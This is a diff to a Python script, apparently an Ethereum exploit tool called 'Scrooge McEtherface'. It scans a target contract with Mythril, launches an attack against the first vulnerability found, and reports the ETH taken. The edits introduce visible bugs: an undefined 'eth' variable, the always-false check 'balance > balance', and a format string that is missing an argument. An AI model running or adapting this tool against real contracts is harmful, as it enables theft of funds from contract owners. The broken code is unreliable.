@@ -43,7 +43,7 @@ def w3_request_blocking(sender, receiver, data):
     )
 
     print(
-        "Transaction sent successfully (%s). Waiting for transaction to be mined..."
+        "Transaction sent successfully, tx-hash: %s. Waiting for transaction to be mined..."
         % tx_hash.hex()
     )
     tx_hash = w3.eth.waitForTransactionReceipt(tx_hash, timeout=120)
@@ -51,7 +51,7 @@ def w3_request_blocking(sender, receiver, data):
     return tx_hash
 
 
-def get_vulnerabilities(target_address, tx_count):
+def get_vulns(target_address, tx_count):
     myth = Mythril(enable_online_lookup=False, onchain_storage_access=True)
 
     if re.match(r"^https", rpc):
@@ -135,6 +135,9 @@ def commence_attack(sender_address, target_address, vuln):
         else:
             sys.exit()
 
+
+# Main
+
 config_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "config.ini")
 
 try:
@@ -163,22 +166,21 @@ except ValueError as e:
 
 w3 = Web3(HTTPProvider(rpc))
 
-# This is where the main fun begins!
+# Commence attack
 
 print(
     "Scrooge McEtherface at your service.\nExploring %s with %d symbolic transactions.\n"
     % (target_address, tx_count)
 )
 
-balance = w3.eth.getBalance(sender_address)
-eth = w3.fromWei(balance, 'ether')
+balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")
 
 print("Your initial account balance is %.02f ETH.\nCharging lasers..." % eth)
 
 # FIXME: Handle multiple issues being returned
 
 try:
-    vuln = get_vulnerabilities(target_address, tx_count)[0]
+    vuln = get_vulns(target_address, tx_count)[0]
 except InvulnerableError:
     critical("No attack vector found.")
 except Exception as e:
@@ -188,7 +190,12 @@ target_balance = w3.eth.getBalance(target_address)
 
 commence_attack(sender_address, target_address, vuln)
 
-balance = w3.eth.getBalance(sender_address)
-eth = w3.fromWei(balance, 'ether')
+_balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")
 
-print("Your final account balance is %.02f ETH.\n" % eth)
+if balance > balance:
+    print(
+        "Snagged %d ETH. Your final account balance is %.02f ETH.\n"
+        % (_balance - balance)
+    )
+else:
+    print("Attack unsuccessful (no ETH transferred).")
